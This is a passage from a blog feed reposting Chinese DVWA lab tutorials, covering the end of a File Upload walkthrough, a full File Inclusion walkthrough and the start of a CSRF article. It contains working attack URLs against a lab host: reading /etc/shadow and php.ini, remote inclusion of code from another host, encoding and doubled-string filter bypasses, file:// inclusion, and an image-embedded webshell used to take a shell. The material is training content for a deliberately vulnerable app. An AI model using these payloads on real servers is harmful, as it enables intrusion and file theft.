filename)</em></p><p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p><p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>采用%00截断的方法可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片，由于实验环境的php版本原因，这里只演示如何借助High级别的文件包含漏洞来完成攻击。</p><p>首先利用copy将一句话木马文件php.php与图片文件1.jpg合并</p><p><a href="http://image.3001.net/images/20161108/14785919066957.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785919066957.png!small" alt="1.png"></a></p><p><a href="http://image.3001.net/images/20161108/1478591932218.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/1478591932218.png!small" alt="1.png"></a></p><p>生成的文件hack.jpg</p><p><a href="http://image.3001.net/images/20161108/14785919572763.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785919572763.png!small" alt="1.png"></a></p><p>打开可以看到，一句话木马藏到了最后。</p><p><a href="http://image.3001.net/images/20161108/14785919855138.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785919855138.png!small" alt="1.png"></a></p><p>顺利通过文件头检查，可以成功上传。</p><p><a href="http://image.3001.net/images/20161108/14785920131063.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785920131063.png!small" alt="1.png"></a></p><p>上菜刀，右键添加shell，地址栏填入<a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/hackable/uploads/hack.jpg</a></p><p>参数名填apple，</p><p>脚本语言选择php。</p><p><a href="http://image.3001.net/images/20161108/14785920369582.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785920369582.png!small" alt="1.png"></a></p><p>成功拿到webshell。</p><p><a href="http://image.3001.net/images/20161108/14785921471182.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785921471182.png!small" alt="1.png"></a></p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">'hackable/uploads/'</span>; </span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; </span></span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext; </span><br><span class="line">    $temp_file     = ( ( ini_get( <span class="string">'upload_tmp_dir'</span> ) == <span class="string">''</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">'upload_tmp_dir'</span> ) ) ); </span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">'jpg'</span> || strtolower( $uploaded_ext ) == <span class="string">'jpeg'</span> || strtolower( $uploaded_ext ) == <span class="string">'png'</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_type == <span class="string">'image/jpeg'</span> || $uploaded_type == <span class="string">'image/png'</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span></span><br><span class="line">        <span class="keyword">if</span>( $uploaded_type == <span class="string">'image/jpeg'</span> ) &#123; </span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp ); </span><br><span class="line">            imagejpeg( $img, $temp_file, <span class="number">100</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp ); </span><br><span class="line">            imagepng( $img, $temp_file, <span class="number">9</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( $img ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder? </span></span><br><span class="line">        <span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files </span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( $temp_file ) ) </span><br><span class="line">            unlink( $temp_file ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em>in_get(varname)</em></p><p>函数返回相应选项的值</p><p><em>imagecreatefromjpeg ( filename )</em></p><p>函数返回图片文件的图像标识，失败返回false</p><p><em>imagejpeg ( image , filename , quality)</em></p><p>从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从0（最差质量，文件更小）到100（最佳质量，文件最大）。</p><p><em>imagedestroy( img )</em></p><p>函数销毁图像资源</p><p>可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="DVWA教程" scheme="http://wlfsky.com/tags/DVWA%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之File Inclusion</title>
    <link href="http://wlfsky.com/2018/01/19/DVWA%E4%B9%8BFile-Inclusion/"/>
    <id>http://wlfsky.com/2018/01/19/DVWA之File-Inclusion/</id>
    <published>2018-01-19T07:50:28.000Z</published>
    <updated>2018-01-19T08:27:53.717Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><strong><em>本文转载自 FreeBuf.COM：lonehand</em></strong></p><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA共有十个模块，分别是</p><blockquote><p>Brute Force（蛮力攻击）</p><p>Command Injection（命令行注入）</p><p>CSRF（跨站请求伪造）</p><p>File Inclusion（文件包含）</p><p>File Upload（文件上传）</p><p>Insecure CAPTCHA （不安全的验证码）</p><p>SQL Injection（SQL注入）</p><p>SQL Injection（Blind）（SQL盲注）</p><p>XSS（Reflected）（反射型跨站脚本）</p><p>XSS（Stored）（存储型跨站脚本）</p></blockquote><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p><p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a><strong>File Inclusion</strong></h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p><p><a href="http://image.3001.net/images/20161106/14784220172185.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784220172185.png!small" alt="1.png"></a></p><p>下面对四种级别的代码进行分析。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，服务器端对page参数没有做任何的过滤跟检查。</p><p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p><p><a href="http://image.3001.net/images/20161106/14784220488447.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784220488447.png!small" alt="1.png"></a></p><p>点击file1.php后，显示如下</p><p><a href="http://image.3001.net/images/20161106/14784220802790.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784220802790.png!small" alt="1.png"></a></p><p>而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>1.本地文件包含</p><p>构造url</p><blockquote><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=/etc/shadow</a></p></blockquote><p><a href="http://image.3001.net/images/20161106/14784221284731.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784221284731.png!small" alt="1.png"></a></p><p>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径C:\xampp\htdocs。</p><p>构造url（绝对路径）</p><blockquote><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:\xampp\htdocs\dvwa\php.ini</a></p></blockquote><p>成功读取了服务器的php.ini文件</p><p><a href="http://image.3001.net/images/20161106/1478422166374.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/1478422166374.png!small" alt="1.png"></a></p><p>构造url（相对路径）</p><blockquote><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=..................\xampp\htdocs\dvwa\php.ini</a></p></blockquote><p>加这么多..\是为了保证到达服务器的C盘根目录，可以看到读取是成功的。</p><p><a href="http://image.3001.net/images/20161106/14784222219706.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784222219706.png!small" alt="1.png"></a></p><p>同时我们看到，配置文件中的Magic_quote_gpc选项为off。在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别，即下面两个url是完全等效的。</p><blockquote><p>A)<a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=..................\xampp\htdocs\dvwa\php.ini</a></p><p>B)<a href="">http://192.168.153.130/xampp/htdocs/dvwa/php.ini</a></p></blockquote><p>可惜的是由于本次实验环境的php版本为5.4.31，所以无法进行验证。</p><p><a href="http://image.3001.net/images/20161106/14784222529627.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784222529627.png!small" alt="1.png"></a></p><p>使用%00截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php，这时链接A会读取失败，而链接B可以绕过规则成功读取。</p><p>2.远程文件包含</p><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>在远程服务器192.168.5.12上传一个phpinfo.txt文件，内容如下</p><p><a href="http://image.3001.net/images/20161106/14784222814815.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784222814815.png!small" alt="1.png"></a></p><p>构造url</p><blockquote><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt</a></p></blockquote><p>成功在服务器上执行了phpinfo函数</p><p><a href="http://image.3001.net/images/20161106/14784223166097.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784223166097.png!small" alt="1.png"></a></p><p>为了增加隐蔽性，可以对<a href="">http://192.168.5.12/phpinfo.txt</a>进行编码</p><blockquote><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74</a></p></blockquote><p>同样可以执行成功</p><p><a href="http://image.3001.net/images/20161106/14784223562200.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784223562200.png!small" alt="1.png"></a></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation </span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file ); </span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file ); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”<a href="https://”、" target="_blank" rel="noopener">https://”、</a> ” ../”、”..\”替换为空字符，即删除。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。</p><p>例如page=<a href="">hthttp://tp://192.168.5.12/phpinfo.txt</a>时，str_replace函数会将<a href="http://删除，于是page=[http://192.168.5.12/phpinfo.txt]()，成功执行远程命令。" target="_blank" rel="noopener">http://删除，于是page=[http://192.168.5.12/phpinfo.txt]()，成功执行远程命令。</a></p><p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p><p>1.本地文件包含</p><blockquote><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini</a></p></blockquote><p>读取配置文件成功</p><p><a href="http://image.3001.net/images/20161106/14784223912895.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784223912895.png!small" alt="1.png"></a></p><blockquote><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini</a></p></blockquote><p>绝对路径不受任何影响，读取成功</p><p><a href="http://image.3001.net/images/20161106/1478422430551.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/1478422430551.png!small" alt="1.png"></a></p><p>2.远程文件包含</p><blockquote><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt</a></p></blockquote><p>远程执行命令成功</p><p><a href="http://image.3001.net/images/20161106/14784224607432.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784224607432.png!small" alt="1.png"></a></p><blockquote><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74</a></p></blockquote><p>经过编码后的url不能绕过替换规则，因为解码是在浏览器端完成的，发送过去的page参数依然是<a href="">http://192.168.5.12/phpinfo.txt</a>，因此读取失败。</p><p><a href="http://image.3001.net/images/20161106/14784224905493.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784224905493.png!small" alt="1.png"></a></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation </span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123; </span><br><span class="line">    <span class="comment">// This isn't the page we want! </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。</p><p><a href="http://image.3001.net/images/20161106/14784225304478.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784225304478.png!small" alt="1.png"></a></p><p>构造url</p><blockquote><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini</a></p></blockquote><p>成功读取了服务器的配置文件</p><p><a href="http://image.3001.net/images/20161106/14784225715815.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161106/14784225715815.png!small" alt="1.png"></a></p><p>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php </span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">"include.php"</span> &amp;&amp; $file != <span class="string">"file1.php"</span> &amp;&amp; $file != <span class="string">"file2.php"</span> &amp;&amp; $file != <span class="string">"file3.php"</span> ) &#123; </span><br><span class="line">    <span class="comment">// This isn't the page we want! </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="DVWA教程" scheme="http://wlfsky.com/tags/DVWA%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之CSRF</title>
    <link href="http://wlfsky.com/2018/01/19/DVWA%E4%B9%8BCSRF/"/>
    <id>http://wlfsky.com/2018/01/19/DVWA之CSRF/</id>
    <published>2018-01-19T07:40:22.000Z</published>
    <updated>2018-01-19T08:21:52.082Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><strong><em>本文转载自 FreeBuf.COM：lonehand</em></strong></p><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA共有十个模块，分别是</p><blockquote><p>Brute Force（蛮力攻击）</p><p>Command Injection（命令行注入）</p><p>CSRF（跨站请求伪造）</p><p>File Inclusion（文件包含）</p><p>File Upload（文件上传）</p><p>Insecure CAPTCHA （不安全的验证码）</p><p>SQL Injection（SQL注入）</p><p>SQL Injection（Blind）（SQL盲注）</p><p>XSS（Reflected）（反射型跨站脚本）</p><p>XSS（Stored）（存储型跨站脚本）</p></blockquote><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p><p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p><h2 id="CSRF-Cross-site-request-forgery"><a href="#CSRF-Cross-site-request-forgery" class="headerlink" title="CSRF(Cross-site request forgery)"></a><strong>CSRF(Cross-site request forgery)</strong></h2><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。在2013年发布的新版OWASP Top 10中，CSRF排名第8。</p><p><a href="http://image.3001.net/images/20161031/14778952387559.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161031/14778952387559.png!small" alt="1.png"></a></p><p>下面对四种级别的代码进行分析。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 